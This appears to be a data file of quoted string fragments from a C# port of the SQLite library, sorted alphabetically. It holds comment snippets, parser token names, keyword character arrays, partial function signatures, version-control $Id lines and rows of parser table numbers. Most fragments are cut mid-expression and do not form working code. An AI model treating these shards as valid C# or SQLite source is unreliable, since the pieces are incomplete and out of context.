" words, if the value is a string that looks like a number)"
" words, return TRUE if no sync() occurs on the disk files."
" work with UTF-8, UTF-16le, or UTF-16be.  But some implementations may be"
" works for him.  We, the developers, have no way to independently"
" would have already detected db corruption. Similarly, pPage must"
" would have been:  A, nil, nil, nil, B.  To prepend the new slots,"
" writable, generate an error message and return 1.  If it is"
" writable.  But check anyway, just for robustness. "
" write the information on page pPg back to the disk, even though"
" write-lock on the schema table, or (if the client is reading) a"
" write-transaction has already been opened, this function is a no-op."
" write-transaction spanning more than one database file, this routine"
" writing (the flags parameter to [sqlite3_blob_open()] was zero),"
" writing to any of these nPage pages may damage the others, the"
" written, semi-random garbage data might appear in the journal"
" written. For index b-trees, it is the root page of the associated"
" wrong.  An error is returned if ""offset"
" wsFlags in an uninitialized state, the caller may behave unpredictably."
" xFunc() then return that string.  If N is out of range, return 0."
" xInit( db, ref zErrmsg, (sqlite3_api_routines)sqlite3Apis ) != 0 )"
" xMalloc().  Hence we limit the maximum size to 0x7fffff00, giving"
" xMutexFree, xMutexEnter, xMutexTry, xMutexLeave, xMutexHeld and"
" xNext(). Instead, if an error occurs, true is returned (indicating that"
" xferOptimization( pParse, pTab, pSelect, onError, iDb ) != 0 )"
" z : z, ref value )"
" z == """" ) return -1"
" z.ToString() == ""day"" )"
" z.ToString() == ""hour"" )"
" z.ToString() == ""minute"" )"
" z.ToString() == ""month"" )"
" z.ToString() == ""second"" )"
" z.ToString() == ""year"" )"
" z2 != """" "
" zBuf[k], encnames[pMem.enc] )"
" zConverted == """" )"
" zErr == """" )"
" zIn.Contains( ""clob"" ) "
" zIn.Contains( ""floa"" ) "
" zIn.Contains( ""real"" ) ) return SQLITE_AFF_REAL"
" zIn.Contains( ""text"" ) ) return SQLITE_AFF_TEXT"
" zName != """" )"
" zName == ""sqlite_sequence"" )"
" zName, nTabName, zTabName"
" zName,"
" zNum, out pNum ) : Int64.TryParse( zNum, out pNum )"
" zProc == """" )"
" zSql != """" )"
" zSql.Substring( zindex ) : """""
" zStmt = sqlite3MPrintf("""")"
" zVfs == """" ) break"
" zero if the given database connection is or is not in autocommit mode,"
" zero the 28-byte header at the start of the journal file. In either case,"
" zero, then the page is considered to be unpinned. The cache implementation"
" {H12603} zProc may be 0, in which case the name of the entry point"
" {H12605} If an error occurs and pzErrMsg is not 0, then the"
" {H17027} In such cases the,"
" {H17382} However, if SQLite is compiled with the"
" }// Stringify(pIn1, encoding)"
" }// Stringify(pIn2, encoding)"
" }// memcpy( pIndex.zName, zName, nName "
" }// memset( yygotominor.yy346, 0, sizeof( yygotominor.yy346 ) )"
" }//sqlite3DbMallocZero(pParse.db, sizeof("
""" ) "
""" and ""TABLE."
""" and needs to be"
""" are assigned the next sequential"
""" elements in the results set of the view and will assign cursors"
""" flag is present "
""" has more than one primary key"", pTab.zName )"
""" in foreign key definition"","
""" in result sets are expanded."
""" inside"
""" instead of """
""" is an opaque pointer"
""" operator or the TABLE."
""" operators"
""" or ""-"" or "" "" or '"
""" or a ""TABLE."
""" pseudo-table, then pTab points to the"
""" statement. This is a query for"
""" that it found in the column list."
""" that occurs at the end"
""" that occurs at"
""" that occurs in the column list, insert the names of"
""" to be every column in every table"
""" to copy"
""" without a following integer have no name"
""""", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath))"
""""", pExpr.u.zToken )"
""""", zColumn)"
"""$"",             ""SEMI"",          ""EXPLAIN"",       ""QUERY"","
"""%s"", zLoc, zSql.Substring( 0, zLoc ),"
"""%s"":0), zErrMsg)"
"""' doubled "
""", "" "" ).Trim()"
""", """
""", zName, zName, zWhere )"
""".  Assign the next variable number "
""".%s SET "" "
""".sqlite_sequence set name = %Q WHERE name = %Q"","
""": syntax error"", pToken )"
""": syntax error"", yyminor.yy0)"
""": syntax error"", yymsp[0].minor.yy0)"
"""ABORT"",         ""AFTER"",         ""ANALYZE"",       ""ASC"","
"""ADD"",           ""error"",         ""input"",         ""cmdlist"","
"""AS"",            ""COMMA"",         ""ID"",            ""INDEXED"","
"""ATTACH"",        ""BEFORE"",        ""BY"",            ""CASCADE"","
"""BITAND"",        ""BITOR"",         ""LSHIFT"",        ""RSHIFT"","
"""CAST"",          ""COLUMNKW"",      ""CONFLICT"",      ""DATABASE"","
"""CONSTRAINT"",    ""DEFAULT"",       ""NULL"",          ""PRIMARY"","
"""CTIME_KW"",      ""ANY"",           ""OR"",            ""AND"","
"""DESC"",          ""DETACH"",        ""EACH"",          ""FAIL"","
"""EXISTS"",        ""TEMP"",          ""LP"",            ""RP"","
"""FOR"",           ""IGNORE"",        ""INITIALLY"",     ""INSTEAD"","
"""HAVING"",        ""LIMIT"",         ""WHERE"",         ""INTO"","
"""IMMEDIATE"",     ""EXCLUSIVE"",     ""COMMIT"",        ""END"","
"""IS"",            ""BETWEEN"",       ""IN"",            ""ISNULL"","
"""JOIN"",          ""USING"",         ""ORDER"",         ""GROUP"","
"""LE"",            ""LT"",            ""GE"",            ""ESCAPE"","
"""LIKE_KW"",       ""MATCH"",         ""KEY"",           ""OF"","
"""NOTNULL"",       ""NE"",            ""EQ"",            ""GT"","
"""OFFSET"",        ""PRAGMA"",        ""RAISE"",         ""REPLACE"","
"""ON"",            ""DELETE"",        ""UPDATE"",        ""INSERT"","
"""PLAN"",          ""BEGIN"",         ""TRANSACTION"",   ""DEFERRED"","
"""PLUS"",          ""MINUS"",         ""STAR"",          ""SLASH"","
"""REGISTER"",      ""VARIABLE"",      ""CASE"",          ""WHEN"","
"""REM"",           ""CONCAT"",        ""COLLATE"",       ""UMINUS"","
"""RESTRICT"",      ""ROW"",           ""TRIGGER"",       ""VACUUM"","
"""ROLLBACK"",      ""SAVEPOINT"",     ""RELEASE"",       ""TO"","
"""SELECT"",        ""DISTINCT"",      ""DOT"",           ""FROM"","
"""SET"",           ""DEFERRABLE"",    ""FOREIGN"",       ""DROP"","
"""SQLITE_TEMP_FILE_PREFIX, zTempPath)"
"""TABLE"",         ""CREATE"",        ""IF"",            ""NOT"","
"""THEN"",          ""ELSE"",          ""INDEX"",         ""ALTER"","
"""UNION"",         ""ALL"",           ""EXCEPT"",        ""INTERSECT"","
"""UNIQUE"",        ""CHECK"",         ""REFERENCES"",    ""AUTOINCR"","
"""UPLUS"",         ""BITNOT"",        ""STRING"",        ""JOIN_KW"","
"""VALUES"",        ""INTEGER"",       ""FLOAT"",         ""BLOB"","
"""VIEW"",          ""VIRTUAL"",       ""REINDEX"",       ""RENAME"","
"""addr"", ""opcode"", ""p1"", ""p2"", ""p3"", ""p4"", ""p5"", ""comment"","
"""anylist"", }"
"""between_op"",    ""in_op"",         ""case_operand"",  ""case_exprlist"","
"""carg"",          ""ccons"",         ""term"",          ""expr"","
"""carglist"",      ""id"",            ""ids"",           ""typetoken"","
"""case_else"",     ""uniqueflag"",    ""collate"",       ""nmnum"","
"""create_table"",  ""create_table_args"",  ""createkw"",      ""temp"","
"""database is deadlocked"":0))"
"""defer_subclause_opt"",  ""orconf"",        ""resolvetype"",   ""raisetype"","
"""delete"", ""persist"", ""off"", ""truncate"", ""memory"""
"""directory_name"""
"""distinct"",      ""selcollist"",    ""from"",          ""where_opt"","
"""ecmd"",          ""explain"",       ""cmdx"",          ""cmd"","
"""encrypted_key"
"""file"""
"""groupby_opt"",   ""having_opt"",    ""orderby_opt"",   ""limit_opt"","
"""ifexists"",      ""fullname"",      ""oneselect"",     ""multiselect_op"","
"""ifnotexists"",   ""dbnm"",          ""columnlist"",    ""conslist_opt"","
"""init_deferred_pred_opt"",  ""conslist"",      ""tcons"",         ""idxlist"","
"""itemlist"",      ""exprlist"",      ""likeop"",        ""escape"","
"""joinop"",        ""indexed_opt"",   ""on_opt"",        ""using_opt"","
"""joinop2"",       ""inscollist"",    ""sortlist"",      ""sortitem"","
"""key_opt"",       ""add_column_fullname"",  ""kwcolumn_opt"",  ""create_vtab"", "
"""lock_file_path"""
"""lock_proxy_file"", SQLITE_STATIC )"
"""memory"""
"""nexprlist"",     ""setlist"",       ""insert_cmd"",    ""inscollist_opt"","
"""null"": type==7"
"""onconf"",        ""sortorder"",     ""autoinc"",       ""idxlist_opt"","
"""order"", ""from"", ""detail"""
"""plus_opt"",      ""number"",        ""trigger_decl"",  ""trigger_cmd_list"","
"""real"": ""integer"""
"""refargs"",       ""defer_subclause"",  ""refarg"",        ""refact"","
"""sclp"",          ""as"",            ""seltablist"",    ""stl_prefix"","
"""select"",        ""column"",        ""columnid"",      ""type"","
"""sql = sqlite_rename_table(sql, %Q), """
"""sqlite3_get_table() called with two or more incompatible queries"""
"""table %s: xBestIndex returned an invalid plan"", pTab.zName)"
"""transtype"",     ""trans_opt"",     ""nm"",            ""savepoint_opt"","
"""trigger_cmd"",   ""trnm"",          ""tridxby"",       ""database_kw_opt"","
"""trigger_time"",  ""trigger_event"",  ""foreach_clause"",  ""when_clause"","
"""typename"",      ""signed"",        ""plus_num"",      ""minus_num"","
"""unlocked"", ""shared"", ""reserved"", ""pending"", ""exclusive"""
"""utf-16"""
"""utf-16be"""
"""utf-16le"""
"""vtabarglist"",   ""vtabarg"",       ""vtabargtoken"",  ""lp"",          "
"%d"","
"%d, sql=%Q "" "
"%d,%Q)"
"%dz"", pMem.u.nZero )"
"' "" "
"'' doubled and enclosed in '',"
"', '"
"', '[', false )"
"', put them in ""[]"".  Like this:"
"'0', '1', '2', '3', '4', '5', '6', '7',"
"'8', '9', 'A', 'B', 'C', 'D', 'E', 'F'"
"'A','C','U','U','M','V','I','E','W','I','N','I','T','I','A','L','L','Y',"
"'A','R','Y','D','E','F','E','R','R','E','D','I','S','T','I','N','C','T',"
"'A','S','C','A','D','E','L','E','T','E','C','A','S','E','C','O','L','L',"
"'A','T','E','C','R','E','A','T','E','C','U','R','R','E','N','T','_','D',"
"'A','T','E','D','E','T','A','C','H','I','M','M','E','D','I','A','T','E',"
"'B','A','C','K','R','O','W','U','N','I','O','N','U','S','I','N','G','V',"
"'D','R','O','P','F','A','I','L','F','R','O','M','F','U','L','L','G','L',"
"'E','A','N','D','E','F','A','U','L','T','A','U','T','O','I','N','C','R',"
"'E','B','E','T','W','E','E','N','O','T','N','U','L','L','I','K','E','C',"
"'E','C','K','E','Y','B','E','F','O','R','E','I','G','N','O','R','E','G',"
"'E','M','E','N','T','C','A','S','T','C','O','L','U','M','N','C','O','M',"
"'E','R','R','A','B','L','E','L','S','E','X','C','E','P','T','R','A','N',"
"'E','S','V','I','R','T','U','A','L','I','M','I','T','W','H','E','N','W',"
"'E','X','P','L','A','I','N','S','T','E','A','D','D','A','T','A','B','A',"
"'F','E','R','E','N','C','E','S','C','O','N','S','T','R','A','I','N','T',"
"'H','E','R','E','N','A','M','E','A','F','T','E','R','E','P','L','A','C',"
"'J','O','I','N','S','E','R','T','M','A','T','C','H','P','L','A','N','A',"
"'L','Y','Z','E','P','R','A','G','M','A','B','O','R','T','V','A','L','U',"
"'M','I','T','C','O','N','F','L','I','C','T','C','R','O','S','S','C','U',"
"'O','B','Y','I','F','I','S','N','U','L','L','O','R','D','E','R','E','S',"
"'O','F','F','S','E','T','E','M','P','O','R','A','R','Y','U','N','I','Q',"
"'P','D','A','T','E','B','E','G','I','N','N','E','R','E','L','E','A','S',"
"'P','O','I','N','T','E','R','S','E','C','T','R','I','G','G','E','R','E',"
"'R','E','I','N','D','E','X','E','D','E','S','C','A','P','E','A','C','H',"
"'R','R','E','N','T','_','T','I','M','E','S','T','A','M','P','R','I','M',"
"'S','A','C','T','I','O','N','A','T','U','R','A','L','T','E','R','A','I',"
"'S','E','L','E','C','T','A','B','L','E','F','T','H','E','N','D','E','F',"
"'S','E','X','C','L','U','S','I','V','E','X','I','S','T','S','A','V','E',"
"'T','R','I','C','T','O','U','T','E','R','I','G','H','T','R','O','L','L',"
"'U','E','R','Y','A','T','T','A','C','H','A','V','I','N','G','R','O','U',"
"'c', 'a', 'l', 'l', 'e', 'd', ' ',"
"'l', 'i', 'b', 'r', 'a', 'r', 'y', ' ',"
"'o', 'f', ' ',"
"'o', 'u', 't', ' ', 'o', 'f', ' ', 'm', 'e', 'm', 'o', 'r', 'y', 0"
"'o', 'u', 't', ' ',"
"'r', 'o', 'u', 't', 'i', 'n', 'e', ' ',"
"'s', 'e', 'q', 'u', 'e', 'n', 'c', 'e', 0"
"(A) = (unsigned char)(B)),1 : sqlite3PutVarint32((A), (B)))"
"(A)),1 : sqlite3GetVarint32((A), (u32 "
"(assert(0),1):0)"
"(pRowid!=0), iReg"
"(v), sizeof(v)))"
"(va_arg(ap,int"
") $Id: analyze.c,v 1.52 2009/04/16 17:45:48 drh Exp $"
") $Id: bitvec.c,v 1.17 2009/07/25 17:33:26 drh Exp $"
") $Id: btree.h,v 1.120 2009/07/22 00:35:24 drh Exp $"
") $Id: journal.c,v 1.9 2009/01/20 17:06:27 danielk1977 Exp $"
") $Id: memjournal.c,v 1.12 2009/05/04 11:42:30 danielk1977 Exp $"
") $Id: pager.c,v 1.629 2009/08/10 17:48:57 drh Exp $"
") $Id: pager.h,v 1.104 2009/07/24 19:01:19 drh Exp $"
") $Id: pcache.c,v 1.47 2009/07/25 11:46:49 danielk1977 Exp $"
") $Id: pcache.h,v 1.20 2009/07/25 11:46:49 danielk1977 Exp $"
") $Id: pcache1.c,v 1.19 2009/07/17 11:44:07 drh Exp $"
") $Id: sqlite.h.in,v 1.462 2009/08/06 17:40:46 drh Exp $"
") $Id: sqlite3ext.h,v 1.25 2008/10/12 00:27:54 shane Exp $"
") $Id: sqliteInt.h,v 1.898 2009/08/10 03:57:58 shane Exp $"
") $Id: sqliteLimit.h,v 1.10 2009/01/10 16:15:09 danielk1977 Exp $"
") = et_getdigit(ref realvalue, ref nsd)"
") has not been allocated,"
")"" "" }"
")"", where <rowid> is a reference"
")(P->xCodec(P->pCodec,D,N,X)))==0 ){ E"
")(void), void ("
"))sqlite3_value_text16, COLNAME_COLUMN)"
"))sqlite3_value_text16, COLNAME_DATABASE)"
"))sqlite3_value_text16, COLNAME_DECLTYPE)"
"))sqlite3_value_text16, COLNAME_TABLE)"
"),  /"
"), /"
"), object pArg){"
"), void "
"), void ("
"), void"
"),void ("
"),void"
"),void("
")A,B)"
")MapViewOfFile(pFile.hShared,"
")a)[-offsetof(sqlite3_file,h)]"
")arg, 0, likeFunc, 0, 0, "
")contextMalloc(context, (2"
")db, where db is the sqlite3"
")db->aVTrans, nBytes)"
")pAll.z, pAll.n )"
")pBuf)[got], 0, amt - got)"
")pColDef.z, pColDef.n)"
")pData)[24], sizeof(pPager.dbFileVers))"
")pI64, P4_INT64 )"
")pName.z, pName.n)"
")sqlite3DbMallocRaw(db, 100)"
")sqlite3DbMallocRaw(db, 200)"
")sqlite3DbMallocRaw(db, n / 2 "
")sqlite3DbMallocRaw(db, sizeof(Module) "
")sqlite3DbMallocZero( db, sizeof(Column) "
")sqlite3DbMallocZero( db, sizeof(Table))"
")sqlite3DbMallocZero( db, sizeof(Trigger ))"
")sqlite3DbMallocZero(db, Mem.Length "
")sqlite3DbMallocZero(db, nBytes)"
")sqlite3DbMallocZero(db, sizeof(Incrblob))"
")sqlite3GetVTable(db, pParse->apVtabLock[i])"
")sqlite3GetVTable(db, pTab)"
")sqlite3Malloc(db, pTab.nCol "
")v, 1, iRow)"
")z, 1)"
")z, n, iOffset, sqlite3BtreePutData)"
")zConverted,"
",                                    /"
",                                  /"
",                              /"
",                     /"
", ...) = 0"
", ...)"
", 1 )"
", AuthContext"
", Bitmask, ExprList"
", Btree "
", Btree"
", CollSeq "
", Expr "
", Expr"
", ExprList "
", ExprList"
", ExprList)"
", FuncDef"
", IdList"
", Index "
", Index"
", Mem"
", MemPage "
", NameContext"
", Need to initialize some global structures"
", Parse"
", PgHdr"
", Pgno "
", Pgno x)"
", Pgno)"
", Pgno, const u8 "
", Pgno, int createFlag, PgHdr"
", Pgno, u8)"
", Select "
", Select"
", Select)"
", SelectDest"
", SrcList "
", SrcList"
", Table "
", Table"
", Token "
", Token"
", Trigger "
", Trigger"
", TriggerStep"
", VTable "
", VdbeCursor"
", WhereClause"
", WhereCost"
", but define them anyway,"
", char "
", char"
", const CollSeq"
", const Mem"
", const Token"
", const char "
", const char"
", const u8"
", const void "
", const void pKey, i64 nKey,"
", const void"
", double"
", double)"
", i64 "
", i64 pSize)"
", i64 size)"
", i64"
", i64)"
", int "
", int N)"
", int N, void"
", int addr)"
", int addr, const char "
", int addr, int N)"
", int addr, int P1)"
", int addr, int P2)"
", int addr, int P3)"
", int amt, i64 offset)"
", int discard)"
", int exFlag, int)"
", int flags)"
", int iAmt, sqlite3_int64 iOfst)"
", int iCol)"
", int iCur, int iDb, Table"
", int id, int newVal)"
", int idx, u32 value)"
", int idxNum, const char "
", int makeDflt)"
", int microseconds)"
", int ms)"
", int n)"
", int n, void("
", int nArg, Expr"
", int nByte, char "
", int nByte, int min "
", int nBytes)"
", int nCachesize)"
", int nOp, VdbeOpList const "
", int onoff)"
", int op, ...)"
", int op, int "
", int op, void "
", int op,int resetFlg)"
", int pAmt)"
", int pRes)"
", int sz, int N "
", int sz, int n)"
", int"
", int("
", int) = 0"
", int)"
", int),"
", int, Expr"
", int, ExprList "
", int, ExprList"
", int, Mem"
", int, Op"
", int, Table "
", int, Token"
", int, Token, Parse"
", int, char "
", int, char"
", int, const char "
", int, const char"
", int, const sqlite3_value"
", int, const void "
", int, const void"
", int, double)"
", int, int "
", int, int n)"
", int, int pResOut)"
", int, int"
", int, int("
", int, int)"
", int, int, const char "
", int, int, int "
", int, int, int"
", int, int, int)"
", int, int, int, int)"
", int, int, u8, const char "
", int, int, void "
", int, int,int,int)"
", int, sqlite3_int64)"
", int, sqlite3_value "
", int, u8, void("
", int, unsigned char"
", int, void"
", int, void("
", int,int"
", int,void("
", or "
", pIdx = pIdx.pNext )"
", pIdxCons"
", pMem"
", pOldItem"
", pOut )"
", pTerm"
", ptr "
", since inline macros don't exist"
", since we use create a class"
", sqlite3 "
", sqlite3"
", sqlite3_context"
", sqlite3_file "
", sqlite3_file"
", sqlite3_int64 "
", sqlite3_int64 size)"
", sqlite3_int64)"
", sqlite3_int64, int), void"
", sqlite3_int64,int)"
", sqlite3_stmt "
", sqlite3_stmt"
", sqlite3_value"
", string zMaster)"
", struct SrcList_item "
", struct SrcList_item"
", u16"
", u16)"
", u32 "
", u32 offset, u32 amt, void"
", u32 pSize)"
", u32"
", u32)"
", u32, Mem"
", u32, u32, void"
", u32, void"
", u64 "
", u64)"
", u8 P5)"
", u8 iBatch, i64)"
", u8)"
", u8, u8)"
", u8, u8, sqlite3_value "
", unsigned iLimit)"
", unsigned int)"
", unsigned key, int createFlag)"
", unsigned oldKey, unsigned newKey)"
", va_list)"
", vfsList)"
", void "
", void ("
", void"
", void("
",-./ "
",...)"
",DbPage"
",Expr"
",ExprList"
",ExprSpan"
",FILE"
",FuncDef"
",IdList"
",PgHdr"
",Pgno)"
",Pgno,int)"
",Pgno,int),"
",Schema"
",Select"
",SrcList"
",Table"
",Token"
",UnpackedRecord"
",Vdbe"
",char const "
",char const"
",char"
",const char "
",const char"
",const sqlite3_api_routines"
",const sqlite3_module"
",const void"
",double)"
",int ,char const "
",int ,char const"
",int eTextRep,const char"
",int eTextRep,const void"
",int i)"
",int iCol)"
",int iDB)"
",int isView,const char"
",int ms)"
",int n,void("
",int nBytes)"
",int"
",int("
",int)"
",int), void"
",int),void"
",int, const char"
",int, const void"
",int, int)"
",int,Expr"
",int,Token"
",int,char const "
",int,char"
",int,const Token"
",int,const char"
",int,const sqlite3_value"
",int,const void"
",int,double)"
",int,int("
",int,int)"
",int,int),"
",int,int,"
",int,int,IdList"
",int,int,int"
",int,int,int)"
",int,int,int,Mem"
",int,int,int,int)"
",int,int,int,int,const char "
",int,int,int,int,int"
",int,int,u8,int)"
",int,int,void"
",int,sqlite3_stmt"
",int,sqlite3_value "
",int,sqlite3_value"
",int,sqlite_int64)"
",int,void"
",int,void("
",sqlite3"
",sqlite3SharedCacheList) = pBt"
",sqlite3SharedCacheList) = pBt.pNext"
",sqlite3SharedCacheList)"
",sqlite3SharedCacheList)==pBt ){"
",sqlite3_callback,void"
",sqlite3_int64)"
",sqlite3_int64),"
",sqlite3_int64,int)"
",sqlite3_int64,int),void"
",sqlite3_int64,int,sqlite3_blob"
",sqlite3_stmt"
",sqlite3_uint64), void"
",sqlite3_value"
",sqlite3_vtab"
",sqlite_int64)"
",sqlite_int64),"
",sqlite_int64),void"
",sqlite_u3264),"
",sqlite_u3264),void"
",u64)"
",u8 enc, const char"
",u8)"
",u8,"
",va_list)"
",void ("
",void"
",void("
"-SQLite wrapper with functions for opening, closing and executing queries."
"...] matching, a ']' character can be included"
".cs"" />"
".url"", SearchOption.AllDirectories)"
"/     1,    1,    1,    1,    1,    1,    1,    1,    1,    1,"
"/     1,    1,    1,    1,    1,    1,    1,    1,    1,  365,"
"/     1,    1,    1,    1,    1,    1,  447,  809,  327,  419,"
"/     1,  639,  304,    1,    1,    1,    1,    1,    1,    1,"
"/     2,    2,    2,    2,    2,    2,    2,    2,    2,    2,"
"/     2,    2,    2,  416,    2,    2,  449,  579,  648,  723,"
"/     5,  138,    1,  118,   34,   42,   27,  108,   22,  119,"
"/     7,  482,  337,  424,  334,  424,  334,  444,  100,  499,"
"/    10,   11,   12,   13,   14,  201,   23,   17,   25,  150,"
"/    10,  299,  424,   35,  344,  352,    3,  250,  334,  434,"
"/    11,   80,   81,   82,   83,   84,   85,   86,   87,   88,"
"/    12,   24,  208,  150,  222,  150,  224,  225,  216,  128,"
"/    15,  283,  583,  166,  167,  380,  586,  117,   13,  120,"
"/    19,   20,  194,   22,  150,  150,  150,   26,   27,   58,"
"/    19,   48,   49,  150,  174,   52,  119,  166,  110,   84,"
"/    19,   48,   49,  174,  175,  174,  175,  165,  209,  166,"
"/    19,  129,  130,  131,   96,   61,  104,   99,  100,  101,"
"/    19,  142,  143,  144,  145,   24,  116,   26,   75,   76,"
"/    19,  150,   23,  165,   25,   24,  150,  150,  232,  150,"
"/    22,    3,  140,    4,  253,  253,  253,  253,   63,"
"/    22,  109,   19,   24,   20,  104,   38,   25,  104,   22,"
"/    22,  315,  465,  466,  462,  462,   25,   25,   24,   24,"
"/    23,   22,   27,   22,   50,   23,   34,   34,   22,   22,"
"/    23,   25,   23,   25,  118,   25,   22,  102,   50,   23,"
"/    23,  111,   25,  165,  193,  165,  116,   93,   94,   95,"
"/    23,  163,   25,  120,  166,  167,  168,  136,  194,   66,"
"/    23,  165,   25,   23,   23,   25,   25,   23,  211,   25,"
"/    23,  165,   25,  159,  150,   64,  194,  194,  165,  199,"
"/    23,  235,  205,  166,  167,  168,  240,  150,  172,  173,"
"/    23,  252,   22,  252,  118,  118,  118,  118,  118,  113,"
"/    24,   24,   24,   24,  337,   26,   26,   26,   26,   27,"
"/    24,   24,   24,   24,  348,   26,   26,   26,   26,   27,"
"/    24,   24,   24,   24,  395,   26,   26,   26,   26,   27,"
"/    24,   24,  337,   26,   26,   26,   26,   27,   27,   28,"
"/    24,   24,  436,   26,   26,   26,   26,   27,   27,   28,"
"/    24,   24,  497,   26,   26,   26,   26,   27,   27,   28,"
"/    24,   24,  564,   26,   26,   26,   26,   27,   27,   28,"
"/    25,   25,   24,   24,   24,   24,  337,   26,   26,   26,"
"/    25,   25,   24,   24,   24,   24,  445,   26,   26,   26,"
"/    26,   26,   26,   27,   27,   28,   28,   28,   29,  218,"
"/    26,   27,   26,   27,   89,   90,  165,  244,  174,  175,"
"/    26,   27,   27,   28,   28,   28,   29,  218,  309,  337,"
"/    26,   27,   27,   28,   28,   28,   29,  218,  309,  353,"
"/    26,   27,   94,   95,   96,   94,   95,   99,  100,  101,"
"/    26,   27,  150,   53,  150,   55,  160,  174,  175,   59,"
"/    27,   28,   28,   28,   29,  218,  309,  216,  543,  556,"
"/    27,   28,   28,   28,   29,  218,  309,  337,  406,  334,"
"/    27,   28,   28,   28,   29,  218,  309,  486,  445,  337,"
"/    27,   28,   28,   28,   29,  218,  422,  423,  424,   23,"
"/    27,  105,  106,  107,  158,  165,  183,  161,  162,   48,"
"/    28,   28,   29,  218,  309,  187,  211,  360,  520,  440,"
"/    28,   28,   29,  218,  309,  230,  513,  138,  477,  220,"
"/    28,   28,   29,  218,  309,  337,  280,  334,  256,  538,"
"/    28,   28,   29,  218,  422,  423,  214,  422,  423,  455,"
"/    28,   29,  218,   30,  492,   32,  137,   23,   22,  315,"
"/    29,  218,  309,  218,  318,  448,  521,  499,   45,   26,"
"/    29,  218,  309,  337,  138,  334,  416,    2,  268,  337,"
"/    29,  218,  309,  546,  337,   30,  517,   32,  137,  378,"
"/    30,  245,   32,  150,  165,  129,  130,  131,  132,  133,"
"/    35,  344,  445,    3,  337,  394,  337,  333,  423,  278,"
"/    36,   22,   62,  203,  165,   26,   27,  165,  150,  165,"
"/    38,   37,  514,  334,  572,  381,  572,  596,  424,   36,"
"/    45,  174,  175,  135,  165,  137,  174,  175,  190,  191,"
"/    46,  176,  184,  103,  176,   22,   90,  176,  178,   18,"
"/    47,  424,  237,  280,   36,  335,  336,  354,  248,  450,"
"/    48,   49,  165,  174,  175,   48,   49,  165,   43,  233,"
"/    49,   79,   80,   81,   82,   83,   84,   85,   86,   87,"
"/    49,  165,  116,  166,  174,  175,   86,   87,   88,   89,"
"/    49,  174,  175,  165,  165,  165,   19,  112,   22,  114,"
"/    50,   74,   74,  127,    1,   16,   51,  121,   20,  119,"
"/    54,  165,  165,  165,  165,  193,  150,  174,  175,  165,"
"/    55,   69,   70,   66,   67,   68,   69,   70,   71,   72,"
"/    64,  174,  175,  174,  175,   84,   85,   65,  150,  193,"
"/    67,   68,   69,   70,   71,   72,   73,   74,   75,   76,"
"/    69,   70,   71,   72,   73,   74,   75,   76,   77,   78,"
"/    71,   72,   73,   74,   75,   76,   77,   78,  150,   80,"
"/    71,   72,   73,   74,   75,   76,   77,   78,  194,   80,"
"/    71,   72,   73,   74,   75,   76,   77,   78,  218,   80,"
"/    73,   74,   75,   76,   77,   78,  150,   80,   81,   82,"
"/    73,   74,   75,   76,   77,   78,  194,   80,   81,   82,"
"/    74,   23,  150,  165,  165,  165,  165,  174,  175,  120,"
"/    75,   76,   77,   78,  150,   80,   81,   82,   83,   84,"
"/    75,   76,   77,   78,  191,   80,   81,   82,   83,   84,"
"/    75,   76,   77,   78,  218,   80,   81,   82,   83,   84,"
"/    77,   78,   25,   80,   81,   82,   83,   84,   85,   86,"
"/    77,   78,  150,   80,   81,   82,   83,   84,   85,   86,"
"/    77,   78,  153,   80,   81,   82,   83,   84,   85,   86,"
"/    77,   78,  186,   80,   81,   82,   83,   84,   85,   86,"
"/    79,  219,  562,  524,  334,  576,  522,  629,  417,  414,"
"/    81,   82,   83,   84,   85,   86,   87,   88,   89,   90,"
"/    83,   84,   85,   86,   87,   88,   89,   90,   19,  150,"
"/    83,   84,   85,   86,   87,   88,   89,   90,   19,  214,"
"/    83,  324,  262,  288,   22,  315,  465,  466,  462,  462,"
"/    84,   85,   86,  165,  105,  106,  107,  193,  165,   93,"
"/    85,   86,   87,   88,   89,   90,   19,   12,  194,  150,"
"/    85,   86,   87,   88,   89,   90,   19,  116,   35,  150,"
"/    85,   86,   87,   88,   89,   90,   19,  150,   97,  165,"
"/    85,   86,   87,   88,   89,   90,   26,   27,  165,   66,"
"/    85,  488,  334,  347,  192,  565,  444,   78,  316,  472,"
"/    86,  150,  205,  150,   65,  166,  174,  175,  206,  207,"
"/    87,   88,   89,   90,   19,   90,  205,   95,   84,   85,"
"/    87,   88,   89,   90,   19,  150,  150,  165,  205,  182,"
"/    87,   88,   89,   90,   19,  196,  160,  150,   23,  173,"
"/    87,   88,   89,   90,   26,   27,  160,   26,   27,   48,"
"/    87,  430,  334,  383,  445,  431,  334,  274,  196,  331,"
"/    88,   89,   90,  222,  223,  224,  225,   66,   67,   68,"
"/    89,   90,   19,   90,   19,   94,  174,   25,   25,   80,"
"/    89,   90,   19,  150,   95,  165,  144,  145,  150,  150,"
"/    89,   90,   19,  183,  150,  222,   23,  224,  225,  237,"
"/    90,  247,   84,   85,  100,  136,  183,   66,   67,   68,"
"/    94,   95,  165,   96,  150,  116,   99,  100,  101,   31,"
"/    94,   95,  174,  175,   98,    5,   23,  116,   25,  193,"
"/    97,   98,  165,  129,  130,  150,  165,  116,  165,  165,"
"/    98,   22,   11,   23,   23,   22,   22,  120,   23,   34,"
"/    98,   55,  174,  174,  175,   66,   67,   68,   69,   70,"
"/    98,  165,   23,  250,  251,  150,  155,  150,   19,   22,"
"/    99,  100,  101,  102,   94,   95,  174,  175,    1,    2,"
"/    99,  444,  104,  358,  334,  345,  424,  340,  157,  468,"
"/   -67,   -1,   -1,   55,   25,  310,    1,    1,    1,    1,"
"/   -98,  -70,  -54,  -36,  -35,  -35,  -35,   13,  -35,   14,"
"/   108,   57,   51,  128,   22,  127,   23,   23,   16,   15,"
"/   109,   66,   67,   68,   69,   70,   71,   72,   73,   74,"
"/   110,  262,  376,  186,  568,  113,  142,  154,  165,  115,"
"/   112,  117,  114,  115,    7,    8,    9,  174,  175,  193,"
"/   115,  165,  177,  174,  175,   66,   67,   68,   69,   70,"
"/   115,  177,  174,  175,   27,   16,  187,   66,   67,   68,"
"/   121,  150,  150,  129,  130,  131,  132,  133,  134,  210,"
"/   122,  123,  124,  126,  599,  328,  614,   55,   58,  615,"
"/   126,  165,  217,  150,   93,   94,   95,  123,  200,   98,"
"/   127,  571,  575,  602,   14,  128,  611,  612,   61,  175,"
"/   129,  130,  131,  132,  133,  134,  193,  150,  125,  124,"
"/   131,  150,  150,  150,  211,  165,  150,  165,  104,  165,"
"/   134,   41,  165,   19,   20,  122,   22,  202,  165,  150,"
